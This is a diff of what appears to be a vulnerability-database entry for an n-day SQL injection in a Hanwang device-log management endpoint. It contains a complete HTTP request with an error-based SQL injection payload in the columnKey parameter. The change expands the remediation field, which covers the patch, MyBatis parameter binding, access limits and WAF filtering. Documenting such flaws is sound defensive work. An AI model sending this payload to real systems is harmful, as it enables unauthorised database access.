@@ -6,7 +6,7 @@ version = ""
 detail = """POST /manage/deviceLog/queryManageDeviceLogs.do HTTP/1.1 Host: target Content-Type: application/x-www-form-urlencoded
 
 columnKey=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT (ELT(2920=2920,1)))),8357))&order=desc&page=1&pageSize=10"""
-fix = "联系厂商获取补丁；${} 改为 #{}"
+fix = "联系汉王厂商获取 TVD-2026-HWN001 安全补丁；将 columnKey 参数的 MyBatis ${} 拼接改为 #{} 预编译；限制该接口仅允许内网访问；WAF 拦截 SQL 注入特征。"
 date = 20250708
 label = "nday"
 cve = "TVD-2026-HWN001"
